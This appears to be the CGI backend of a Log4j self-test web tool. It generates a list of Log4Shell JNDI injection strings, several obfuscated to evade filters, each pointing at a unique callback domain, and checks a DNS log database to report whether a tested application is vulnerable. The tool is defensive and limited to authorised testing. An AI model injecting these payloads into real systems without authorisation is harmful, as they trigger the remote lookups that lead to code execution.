#!/usr/bin/python3

import sys
import re
import ssl
import os
import mysql.connector
import json

with open("/config.json") as json_data_file:
    data = json.load(json_data_file)

db_ip='log4j-selftest_mysql_1'
db_user=data['mysql']['user']
db_pass=data['mysql']['passwd']
db_name=data['mysql']['db']
dnsserver=data['dns']['domain']

class database:

    def __init__(self,db_ip,db_user,db_pass,db_name):
        self.db_ip = db_ip
        self.db_user = db_user
        self.db_pass = db_pass
        self.db_name = db_name

        self.connect_database()


    def connect_database(self):
        self.conn = mysql.connector.connect(user=self.db_user, password=self.db_pass, host=self.db_ip, database=self.db_name)
        self.cursor = self.conn.cursor()


    def commit(self):
        self.conn.commit()


    def get_entry(self, entry):
        cursor = self.cursor
        lookupQuery = 'SELECT entry FROM dnslogs WHERE entry=%s'
        queryResult = self.cursor.execute(lookupQuery, (entry, ))
        lookupResult = self.cursor.fetchall()

        self.commit()

        if len(lookupResult) == 0:
            return False
        else:
            return True

    def close(self):
        self.cursor.close()
        self.conn.close()

hash=os.getenv("QUERY_STRING")

if not re.match(r"^[a-zA-Z0-9]{30}$", hash):
    print("HTTP/1.0 200 OK")
    print("Content-type: text/html\n\n")
    print("")
    print("Please use the buttons... <br/>")
    print("Trying log4shell in your browser now instead:<br/><br/>")
    print("${jndi:ldap://browser."+dnsserver+"}")
    exit()


db = database(db_ip,db_user,db_pass,db_name)

payloads = [
    "${jndi:ldap://<domain>}",
    "${jndi:ldaps://<domain>}",
    "${jndi:dns://<domain>}",
    "${jndi:rmi://<domain>}",
    "${jndi:${lower:l}dap://<domain>}",
    "${jndi:${upper:l}dap://<domain>}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<domain>}",
    "${${env:NO_WAY_THIS_ENV_NAME_EXISTS:-j}ndi:ldap://<domain>}",
    "${j${loWer:Nd}i${uPper::}${LowER:ld}ap${UPPER::}//<domain>}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<domain>}",
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://<domain>}",
    "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//<domain>}",
    "{j${k8s:k5-:ND}i${sd:k5:-:}ldap://<domain>}",
    "${jndi:ldap://127.0.0.1#<domain>}"
]

domain = hash+"."+dnsserver

payload_html= ""
payload_ip_html = ""

for payload in payloads:
    payload_html += payload.replace("<domain>",domain)+"<br/>"
#    payload_ip_html += payload.replace("<domain>","10.22.236.10:8080/cb/cb.py?"+hash)+"<br/>"


result = "ERROR"

domain_found = None
try:
    domain_found = db.get_entry(domain)
    db.close()
except:
    pass

if domain_found:
    result = '<div style="color:red;border-style:solid;"><b>'
    result += '!!! A callback has received, the application where you pasted the payload is VULNERABLE'
    result += '</b></div>'
else:
    result = '<div style="color:green;border-style:solid;"><b>'
    result += "There was no callback from your payload received (yet)."
    result += '</b></div>'

print("HTTP/1.0 200 OK")
print("Content-type: text/html\n\n")
print("")

html_response = """

<!DOCTYPE html>
 <html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="keywords" content="Log4j Self-test tool" />
    <meta name="description" content="Log4j Self-test tool" />

    <meta property="og:type" content="website" />
    <meta property="og:description" content="Log4j Self-test tool" />
    <meta property="og:title" content="Log4j Self-test tool" />
    <meta property="og:url" content="" />
    <meta http-equiv="refresh" content="30">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous" />
    <title>
      Log4j Self-test tool
    </title>
  </head>
  <body>
    <div class="container" style="max-width: 1440px;">

    <h1>Unique string: {hash}</h1>
    <br/></br>
    <b>The application that you are trying to test has to be able to resolve {domain}, otherwise this test will not be reliable!</b> 
    <br/>
    You can test this by generating a unique payload and run: <br/>
    <code>dig test.{domain}</code><br/>
    This should result in a "127.0.0.1" response.<br/><br/>
    <p>
    Please know that <strong>a negative test does not guarantee that your application is patched.</strong>
    The tool is designed to offer a simpler means of testing and is intended for testing
    purposes only—it should only be used on systems you are authorized to test.
    <br/><br/>
    Paste a combination of these payloads in your apps, think about fields and locations that you know/think log4j would log about.<br/>
    Make sure that the entire string is fully pastable in the field, it should <b><u>not</u></b> be shortened.
    <br/><br/>{payload_html}
    <br/>
    {payload_ip_html}
    <br/>
    {result}
    <br/>
    It can take a couple of minutes before the results have been processed. (Page auto-refreshes every 30 seconds)
    <br/><br/>
    If you did not paste these payloads in your applications, but the page already shows that it is vulnerable, please regenerate the payloads via the main page!
    </div>
    </body>
    </html>
"""

html_response = html_response.replace("{hash}", hash)
html_response = html_response.replace("{domain}", domain)
html_response = html_response.replace("{payload_html}", payload_html)
html_response = html_response.replace("{payload_ip_html}", payload_ip_html)
html_response = html_response.replace("{result}", result)

print(html_response)
